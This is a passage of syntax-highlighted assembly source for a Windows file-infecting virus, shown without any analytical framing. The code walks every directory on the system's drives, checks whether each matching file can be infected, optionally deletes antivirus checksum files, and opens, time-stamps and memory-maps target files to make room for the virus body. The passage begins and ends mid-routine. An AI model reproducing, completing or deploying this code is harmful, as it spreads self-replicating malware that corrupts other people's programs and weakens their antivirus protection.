       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">don_t_change</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; do we have any saved find</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_more_handles</span><span class="sc0">                 </span><span class="sc1">; handles?</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">; if we do decrement and pop one</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; of the stack...</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_next_directory</span><span class="sc0">            </span><span class="sc1">; and let's find one more...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_next_dir_found</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; if no next dir was found, let's</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_first_dir_found</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; close the find handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_first_dir_found</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_more_handles</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; when all handles are closed in</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; the current drive let's try</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; the next one...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">           </span><span class="sc1">; 0ffh marks the end...</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">parse_all_system</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">scanneddirs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quit_this</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; if we didn't find all the files</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quit_this</span><span class="sc0">                       </span><span class="sc1">; during our search</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_paths</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; then we must reset ourselves</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">quit_this</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; restore all and go away...</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateNextDirectory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateFilesInDirectory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemasks</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; point the filemasks</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">try_next_ext</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_files</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; search first matching file</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_files</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchhandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; save it's handle</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">test_file</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; skip directories</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; point the name</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ValidateFile</span><span class="sc0">                  </span><span class="sc1">; can we infect it?</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">                      </span><span class="sc1">; open the file!!</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_file</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_files</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; search the next file</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchhandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_files</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">test_file</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_files</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchhandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; close the search handle</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">RETRO</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EraseChecksums</span><span class="sc0">                </span><span class="sc1">; kill av files?</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">; locate the next extension</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; in the list</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_more</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">try_next_ext</span><span class="sc0">                   </span><span class="sc1">; and try again...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">no_more</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateFilesInDirectory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Open the file                                                          Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  ESI = pointer to the file name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">OpenFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                             </span><span class="sc1">; save registers</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileofs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; save file name offset</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">; save it</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileAttributes</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the file attributes</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">error1</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileattributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; save them</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">error1</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributes</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; set them as normal</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; and open the file</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; error?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_file_exit</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save it's handle</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; now save the file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileTime</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; get file size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileSize</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; save the filesize and calculate</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">+</span><span class="sc2">500h</span><span class="sc0">            </span><span class="sc1">; ammount of memory needed</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; and create a file mapping</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; save map handle</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">+</span><span class="sc2">500h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; map the file!!</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;                          ;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
